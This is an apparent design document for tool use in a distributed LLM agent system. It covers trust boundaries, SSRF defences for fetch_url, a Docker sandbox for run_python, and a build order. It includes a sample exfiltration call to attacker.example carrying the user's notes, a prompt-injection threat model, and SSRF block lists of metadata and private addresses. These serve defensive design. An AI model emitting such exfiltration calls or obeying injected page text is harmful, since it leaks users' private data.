# Tools and agents: design

Status (2026-09-29):

- **Web research is built** as a fixed pipeline: search → read → answer with sources. See [agents.md](agents.md). It runs on the asker's node, the model never chooses a URL, and fetch_url has the SSRF rules below.
- **The code pipeline is built** as a fixed pipeline: write → test in the sandbox → fix, up to 3 rounds ([agents.md](agents.md#tested-python-code)). Its fix rounds prefer the worker of the first round (a simple form of session affinity).
- Not built yet: free tool choice by the model (and passing `tools` through the mesh), general session affinity, per-domain approvals, and the "local model only" setting.

This design incorporates an external review of the first proposal; the changes are marked **(review)**.

## The loop

A model never acts by itself. The asker's node runs a loop: it gives the model the question and a list of tools, the model replies with a tool call or an answer, the node runs allowed calls and feeds results back, and this repeats until the model answers. This is ReAct-style function calling. Qwen3, Qwen3.5, Granite 4.2 and Ministral 3 support it in the pinned llama.cpp.

## Trust boundaries

1. **Tools run only on the asker's own node.** Remote nodes are text generators. They never receive tool results they did not need, and they never run anything.
2. **The model's output is untrusted, wherever it came from (review).** A remote node generates the tool calls. A malicious or compromised peer can emit `fetch_url("https://attacker.example/?d=<your notes>")` just as a poisoned web page can trick an honest model. So protection comes from **what tools may do**, not from which machine produced the call.
3. **Privacy flows outward (review).** Every reasoning step sends the whole context to whichever node runs the model: the question, fetched pages, pack-memory results, code output.
   - Tools that read local or private data (pack search, files, code results) get a setting **"local model only"**: that session's reasoning stays on this node.
   - Otherwise the UI shows a clear warning before private data leaves.
4. **"Tool results are untrusted" markers help, but are not a defence (review).** Small models follow them inconsistently. The real defences are the capability limits below.

## Capability limits (the real defence)

- **fetch_url may only open URLs that appeared in a search result or in the user's own message in this session (review).** Anything else needs approval. This one rule removes most prompt-injection exfiltration: a read-only GET with data in the query string still leaks, so "read-only" alone is not enough.
- **SSRF protection in fetch_url (review):**
  - Resolve DNS **once**, check the address, then connect to **that exact IP**. This defeats DNS rebinding.
  - Re-check on **every redirect hop**, with a small hop limit.
  - Block:
    - loopback, private, link-local and CGNAT ranges
    - `0.0.0.0`, `169.254.169.254` and other metadata addresses
    - IPv6 `::1`, `fc00::/7`, `fe80::/10`, and IPv4-mapped IPv6 (`::ffff:a.b.c.d`)
    - decimal, octal and hex IP spellings (parse, never string-match)
  - Enforce size and time limits **while streaming**, not after the download finishes.
  - Allow only http(s) on the default ports. Never send cookies or credentials.
- **run_python:** a network-less, memory- and CPU-capped, read-only Docker sandbox, with a time limit (built: `apps/node/src/agent/sandbox.ts`). There is no access to the host filesystem: the program arrives on stdin.
- **Approvals (review):** asked **per new domain** and **per first use of each tool in a session**, not per step, so prompts stay meaningful and aren't clicked through.
- **web_search:** through a self-hosted SearXNG. Queries leave from the asker's own connection; the UI says so.

## Reliability for small models (review)

- **Grammar-constrained tool calls:** llama.cpp JSON-schema/GBNF output, so small models cannot produce malformed calls.
- **Hard cap of 3–5 steps**, then a forced "answer now with what you have".
- **Fixed pipelines before free agency:**
  - *Research:* search → pick up to 2 results → read → answer.
  - *Code:* write → run tests in the sandbox → fix, up to N rounds. The Qwen3 8B benchmark's two failures (an edge case, an unstated requirement) are the kind a test loop catches.
  - Free-form tool choice is only offered for models that demonstrably handle it (measured, recorded in the catalog).

## Context and speed

- **Prefill dominates (review).** Each step re-sends a growing context. If step 2 runs on a different node than step 1, that node re-reads the whole 6–8k context.
  - **Agent sessions stick to one worker** (session affinity) so llama.cpp can reuse its KV cache.
  - The system prompt and tool list stay byte-identical across steps.
  - On a GPU node, prefill is about 10× faster (363 vs 35 tok/s for Qwen3 8B), so agents benefit most from GPU nodes. The speed-aware router already prefers them.
- **Fitting pages into 8k tokens (review):**
  - extract the main text (readability-style)
  - split it into chunks and include only the chunks most relevant to the question, ranked by BM25 or the bge-small embedding model the mesh already has
  - once the model has used an old tool result, replace it with a one-line summary

## Build order (proposed)

1. **Protocol:**
   - pass `tools` through the mesh, with grammar-constrained tool calls on workers
   - stream `tool_calls` back in OpenAI format
   - workers still execute nothing
2. **Session affinity** for multi-step requests.
3. **The code pipeline:** `run_python` sandbox plus the write → test → fix loop. This is the most useful first tool, and it is fully local.
4. **Research pipeline:** SearXNG `web_search`, `fetch_url` with the SSRF rules and the "only URLs from results" rule, and chunk selection.
5. **UI:** step timeline ("Searching…", "Reading…", "Running tests… 1 failed"), approvals per domain and per tool, and the "local model only" setting.
6. **Tests:**
   - an SSRF test matrix (rebinding, redirects, IPv6, encodings)
   - an exfiltration test: a malicious fake worker emitting a URL with data must be refused
   - step caps and sandbox escapes
